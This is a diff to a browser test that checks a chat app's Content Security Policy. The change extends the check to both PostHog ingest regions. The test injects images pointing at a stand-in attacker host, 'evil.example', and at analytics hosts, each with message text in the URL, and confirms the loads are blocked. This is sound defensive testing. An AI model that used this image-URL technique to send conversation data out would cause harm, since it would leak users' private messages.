@@ -83,7 +83,10 @@ for (const path of ['/', '/chat']) {
 
 			// The case the policy exists for: an <img> naming another host, carrying data in its URL.
 			// The control image beside it is our own, so a pass cannot come from injection not working.
-			const result = await page.evaluate(async () => {
+			// Both PostHog Cloud regions' ingest hosts, since the CSP allows either for fetches while the
+			// project moves from US to EU (config/posthogRegion.mjs CLOUD_HOSTS); neither may load an image.
+			const ingestHosts = ['us.i.posthog.com', 'eu.i.posthog.com'];
+			const result = await page.evaluate(async (ingestHosts) => {
 				const violations: string[] = [];
 				document.addEventListener('securitypolicyviolation', (event) => {
 					violations.push(`${event.effectiveDirective} ${event.blockedURI}`);
@@ -99,10 +102,10 @@ for (const path of ['/', '/chat']) {
 				const remote = await load('https://evil.example/x.png?d=earlier-message-text');
 				// An analytics ingest host records an event sent as an image's query string, so it
 				// counts as another host however familiar it looks.
-				const ingest = await load('https://us.i.posthog.com/e/?data=earlier-message-text');
+				for (const host of ingestHosts) await load(`https://${host}/e/?data=earlier-message-text`);
 				const own = await load('/favicon.svg');
-				return { remote, ingest, own, violations };
-			});
+				return { remote, own, violations };
+			}, ingestHosts);
 			expect(
 				result.own,
 				'our own /favicon.svg did not load, so the injection itself is broken'
@@ -110,16 +113,18 @@ for (const path of ['/', '/chat']) {
 			expect(result.remote, 'the remote image loaded').toBe(false);
 			// PostHog answers with JSON, so this image fails to load either way; the violation below is what
 			// shows the request never left.
-			expect(
-				result.violations.some((v) => v.startsWith('img-src https://us.i.posthog.com')),
-				`the browser did not report an img-src violation for us.i.posthog.com: ${JSON.stringify(result.violations)}`
-			).toBe(true);
+			for (const host of ingestHosts) {
+				expect(
+					result.violations.some((v) => v.startsWith(`img-src https://${host}`)),
+					`the browser did not report an img-src violation for ${host}: ${JSON.stringify(result.violations)}`
+				).toBe(true);
+			}
 			expect(
 				result.violations.some((v) => v.startsWith('img-src https://evil.example')),
 				`the browser did not report an img-src violation for evil.example: ${JSON.stringify(result.violations)}`
 			).toBe(true);
 			for (const { url } of requested.filter(({ url }) =>
-				['evil.example', 'us.i.posthog.com'].includes(new URL(url).host)
+				['evil.example', ...ingestHosts].includes(new URL(url).host)
 			)) {
 				await expect
 					.poll(() => outcome.get(url), {
